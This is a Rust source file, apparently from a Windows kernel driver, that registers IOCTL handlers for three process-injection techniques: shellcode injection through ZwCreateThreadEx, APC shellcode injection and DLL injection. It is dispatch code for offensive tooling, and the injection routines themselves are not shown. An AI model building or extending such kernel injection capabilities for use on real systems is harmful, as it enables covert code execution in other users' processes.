use {
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{ioctls::{IOCTL_INJECTION_DLL_THREAD, IOCTL_INJECTION_SHELLCODE_APC, IOCTL_INJECTION_SHELLCODE_THREAD}, structs::TargetInjection},
    wdk_sys::{IO_STACK_LOCATION, IRP},
    crate::{handle_injection, injection::{InjectionDLL, InjectionShellcode}, utils::ioctls::IoctlHandler},
};

pub fn get_injection_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Process injection using ZwCreateThreadEx.
    ioctls.insert(IOCTL_INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_INJECTION_SHELLCODE_THREAD");
        let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_thread, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // APC Injection.
    ioctls.insert(IOCTL_INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_INJECTION_SHELLCODE_APC");
        let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_apc, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // DLL injection using ZwCreateThreadEx.
    ioctls.insert(IOCTL_INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_INJECTION_DLL_THREAD");
        let status = unsafe { handle_injection!(stack, InjectionDLL::injection_dll_thread, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

}